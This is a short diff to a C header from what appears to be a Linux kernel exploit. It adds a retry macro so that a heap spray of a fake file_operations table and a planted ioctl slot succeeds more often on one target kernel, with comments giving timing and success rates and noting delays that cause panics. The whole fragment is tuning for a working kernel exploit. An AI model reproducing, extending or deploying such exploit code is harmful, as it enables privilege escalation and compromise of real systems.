@@ -102,6 +102,14 @@
  * 6.1.162 measured: 125ms delay + fresh-page x5 = 67%; 50ms too narrow,
  * 300ms panics. Timing knob only — geometry/offsets untouched. */
 #define APP_FOPS_FRESH_PAGE_ATTEMPTS 5
+/* Single-shot-path lottery (main.c #else): this target does NOT define
+ * APP_REQUIRE_FRESH_P0_SESSION, so production walks the #else single-shot
+ * path where the x5 budget above is dead code (attempt<=1). Define this to
+ * replay clean misses (verified=0, no dirty) with a fresh FOPS page, bound
+ * by APP_FOPS_FRESH_PAGE_ATTEMPTS. ONLY this target defines it; every other
+ * target keeps the verbatim single shot. (APP_FOPS_PREFLIP_GATE below is the
+ * retired pre-trigger-gate flag, kept for record; it gates nothing now.) */
+#define APP_FOPS_SINGLE_PATH_RETRY 1
 /* Pre-flip gate (forensic S6 §2): verify the sprayed fake_fops table is
  * really resident BEFORE the flip (genuine-fd readback of the planted
  * ioctl slot; 5 misses -> clean exit with no flip). Macro-gated: ONLY this
